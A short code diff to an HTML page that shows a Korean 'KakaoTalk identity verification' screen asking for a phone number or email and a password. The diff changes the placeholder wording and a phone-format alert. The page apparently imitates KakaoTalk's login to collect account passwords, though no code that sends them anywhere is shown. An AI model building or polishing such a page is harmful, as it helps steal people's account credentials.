@@ -47,7 +47,7 @@
   <!-- 로그인 화면 -->
   <div id="page2" class="login-container hidden">
     <h2>카카오톡 본인인증하기</h2>
-    <input type="text" placeholder="전화번호 (예: 01012345678)" id="userId" style="width:370px; padding:5px;">
+    <input type="text" placeholder="이메일 또는 전화번호" id="userId" style="width:370px; padding:5px;">
     <input type="password" placeholder="비밀번호" id="userPw" style="width:370px; padding:5px;">
     <button type="button" class="btn-gray" onclick="login()">본인인증하기</button>
   </div>
@@ -75,7 +75,7 @@
       // 전화번호 검증: 010으로 시작하고 11자리 숫자
       const phoneRegex = /^010\d{8}$/;
       if (!phoneRegex.test(userId)) {
-        alert("전화번호는 010으로 시작하고 총 11자리여야 합니다.");
+        alert("잘못된 형식의 전화번호입니다.");
         return;
       }
 
